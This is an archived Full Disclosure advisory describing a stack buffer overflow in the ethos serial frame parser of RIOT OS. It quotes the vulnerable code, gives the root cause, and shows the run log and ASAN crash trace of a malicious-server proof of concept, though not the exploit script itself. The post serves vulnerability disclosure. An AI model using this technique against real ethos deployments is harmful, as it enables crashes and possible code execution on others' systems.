---
title: RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in RIOT ethos Serial Frame Parser
url: https://seclists.org/fulldisclosure/2026/Jan/16
source: Full Disclosure
date: 2026-01-11
fetch_date: 2026-01-12T03:37:54.622642
---

# RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in RIOT ethos Serial Frame Parser

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

![](/shared/images/nst-icons.svg#search)

# RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in RIOT ethos Serial Frame Parser

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sat, 10 Jan 2026 00:26:58 -0500

---

```
A stack-based buffer overflow vulnerability exists in the RIOT OS ethos
utility due to missing bounds checking when processing incoming serial
frame data. The vulnerability occurs in the _handle_char() function, where
incoming frame bytes are appended to a fixed-size stack buffer
(serial->frame) without verifying that the current write index
(serial->framebytes) remains within bounds. An attacker capable of sending
crafted serial or TCP-framed input can cause serial->framebytes to exceed
the buffer size (MTU, 9000 bytes), resulting in a write past the end of the
stack buffer. This condition leads to memory corruption, application crash,
and potentially arbitrary code execution depending on compiler options and
runtime protections.

*Vulnerable Code:*
static void _handle_char(serial_t *serial, char c)
{
    serial->frame[serial->framebytes] = c;
    serial->framebytes++;
}

*Root Cause:*

* serial->frame is a fixed-size stack buffer (char frame[MTU])
* serial->framebytes is unbounded and attacker-controlled
* No validation against MTU before writing

*Proof of Concept:*

*listener:*# python3 payload.py

This exploit acts as a MALICIOUS SERVER.
Run ethos like: ./ethos tap0 tcp:127.0.0.1 20000
The exploit will send the payload when ethos connects.

[*] Starting malicious server on 0.0.0.0:20000
[*] Architecture: aarch64
[*] Exploitation mode: crash

[+] Server listening on 0.0.0.0:20000

[!] Waiting for ethos to connect...
[*] Run ethos like this:
  ./ethos tap0 tcp:127.0.0.1 20000

[+] ethos client connected from ('127.0.0.1', 37114)
[*] Generating crash payload...
[+] Crash payload ready: 9501 bytes
[*] Waiting 1 second before sending payload...
[*] Sending malicious payload (9501 bytes)...
[*] Sent 1024/9501 bytes...
[*] Sent 2048/9501 bytes...
[*] Sent 3072/9501 bytes...
[*] Sent 4096/9501 bytes...
[*] Sent 5120/9501 bytes...
[*] Sent 6144/9501 bytes...
[*] Sent 7168/9501 bytes...
[*] Sent 8192/9501 bytes...
[*] Sent 9216/9501 bytes...
[*] Sent 9501/9501 bytes...
[+] Payload sent successfully!
[!] ethos client should crash now (check for ASAN output)
[*] Received response:
b'~}"\x00\x00\x00\x00\x00\x00~~}"\x00\x00\x00\x00\x00\x00~'
[*] Connection from ('127.0.0.1', 37114) closed

*Connection:*
./ethos tap0 tcp:127.0.0.1 20000

*Output:*----> ethos: sending hello.
----> ethos: activating serial pass through.
ethos.c:186:5: runtime error: index 9000 out of bounds for type 'char[9000]'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ethos.c:186:5
=================================================================
==1375066==ERROR: AddressSanitizer: stack-buffer-overflow on address
0xfbff8f804848 at pc 0xaaaae0b9fad0 bp 0xffffece78420 sp 0xffffece78418
WRITE of size 1 at 0xfbff8f804848 thread T0
    #0 0xaaaae0b9facc in _handle_char
/root/RIOT/dist/tools/ethos/ethos.c:186:39
    #1 0xaaaae0b9ed38 in _serial_handle_byte
/root/RIOT/dist/tools/ethos/ethos.c:216:17
    #2 0xaaaae0b9ed38 in main /root/RIOT/dist/tools/ethos/ethos.c:559:34
    #3 0xffff91162598 in __libc_start_call_main
csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0xffff91162678 in __libc_start_main csu/../csu/libc-start.c:360:3
    #5 0xaaaae0ab67ec in _start (/root/RIOT/dist/tools/ethos/ethos+0x367ec)
(BuildId: 4734887eb4858e961729a4e74b8fbfbd73e74d82)
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

### Current thread:

* **RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in RIOT ethos Serial Frame Parser** *Ron E (Jan 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")